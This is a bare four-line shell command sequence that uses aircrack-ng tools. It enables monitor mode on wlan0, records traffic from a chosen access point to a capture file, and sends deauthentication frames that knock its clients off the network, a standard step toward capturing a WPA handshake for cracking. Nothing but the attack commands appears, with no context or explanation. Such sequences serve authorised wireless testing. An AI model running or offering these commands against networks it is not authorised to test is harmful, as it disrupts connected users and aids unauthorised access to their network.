sudo airmon-ng start wlan0 && \
sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon & \
sleep 5 && \
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
